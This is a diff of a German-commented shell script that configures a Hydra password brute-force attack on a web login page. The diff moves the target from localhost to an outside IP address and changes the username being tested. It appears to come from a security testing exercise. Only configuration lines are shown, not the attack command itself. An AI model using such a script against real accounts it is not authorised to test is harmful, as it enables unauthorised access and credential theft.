@@ -10,16 +10,16 @@
 
 # Konfiguration
 # Für macOS: Localhost verwenden (für WSL/Linux war es: ip route | grep default | awk '{print $3}')
-TARGET="127.0.0.1"
+TARGET="141.87.56.31"
 PORT="5001"
-USERNAME="marc"                 # Zu testender Benutzername (Passwort: 12345)
-PASSWORD_FILE="passwords.txt"       # Passwortliste
+USERNAME="Trader123"                 # Zu testender Benutzername (Passwort: 12345)
+PASSWORD_FILE="passwords.txt"       # Passwortlistec  
 
 # Login-Endpunkt und Parameter
 LOGIN_PATH="/login"
 FAIL_STRING="Ungültige Eingabedaten"  # Fehlermeldung bei falschem Login
 
-echo "========================================"
+#echo "========================================"
 echo "Hydra Bruteforce Attack gestartet"
 echo "========================================"
 echo "Target: http://${TARGET}:${PORT}${LOGIN_PATH}"
